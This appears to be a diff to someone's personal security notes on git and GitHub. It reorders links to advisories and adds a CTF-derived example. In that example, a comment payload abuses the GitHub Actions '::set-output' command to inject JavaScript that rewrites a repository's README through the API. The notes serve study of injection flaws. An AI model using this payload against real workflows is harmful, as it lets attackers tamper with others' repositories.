@@ -442,11 +442,9 @@ https://stackoverflow.com/questions/2928584/how-to-grep-search-committed-code-in
 
 # case studies
 
-- https://bugs.chromium.org/p/project-zero/issues/detail?id=2070
+- [shell: disallow repo names beginning with dash](https://git.kernel.org/pub/scm/git/git.git/commit/?id=3ec804490a265f4c418a321428c12f3f18b7eff5)
 - https://staaldraad.github.io/post/2018-06-03-cve-2018-11235-git-rce/
 - https://medium.com/@knownsec404team/analysis-of-cve-2019-11229-from-git-config-to-rce-32c217727baa
-- https://devcraft.io/2020/10/20/github-pages-multiple-rces-via-kramdown-config.html
-- https://devcraft.io/2020/10/19/github-gist-account-takeover.html
 
 - [GitHub \- newren/git\-filter\-repo: Quickly rewrite git repository history \(filter\-branch replacement\)](https://github.com/newren/git-filter-repo)
 - [GitHub \- Kayvlim/badrepo: Don&\#39;t clone this on a Mac\. Test repository to play around with glitches](https://github.com/Kayvlim/badrepo)
@@ -455,6 +453,26 @@ https://stackoverflow.com/questions/2928584/how-to-grep-search-committed-code-in
     - https://twitter.com/kayvlim/status/565234659081338881
         > Create two files in a #git repository with equal names, but differing a letter: á = U+00E1; á = U+0061 U+0301. Clone on a mac. #UnicodeHell
     - ~/code/guides/sysadmin/badrepo
+
+### github
+
+- Workflow command processing from stdout payload triggers SSTI
+    - [GitHub Capture the Flag results \- The GitHub Blog](https://github.blog/2021-03-22-github-ctf-results/)
+    ```
+    Given workflow steps containing:
+
+    script: |
+        console.log(process.env.COMMENT_BODY)
+    script: |
+        const id = ${{ steps.comment_log.outputs.COMMENT_ID }} // line 30
+
+    Then post comment with payload:
+
+    ::set-output name=COMMENT_ID::1; console.log(context); console.log(process); await github.request('PUT /repos/{owner}/{repo}/contents/{path}', { owner: 'incrediblysecureinc', repo: 'incredibly-secure-Creastery', path: 'README.md', message: 'Escalated to Read-write Access', content: Buffer.from('Pwned!').toString('base64'), sha: '959c46eb0fbab9ab5b5bfb279ab6d70f720d1207' })
+    ```
+- [Issue 2070: Github: Widespread injection vulnerabilities in Actions](https://bugs.chromium.org/p/project-zero/issues/detail?id=2070)
+- https://devcraft.io/2020/10/20/github-pages-multiple-rces-via-kramdown-config.html
+- https://devcraft.io/2020/10/19/github-gist-account-takeover.html
 
 ### pull request triggers a merge push
 
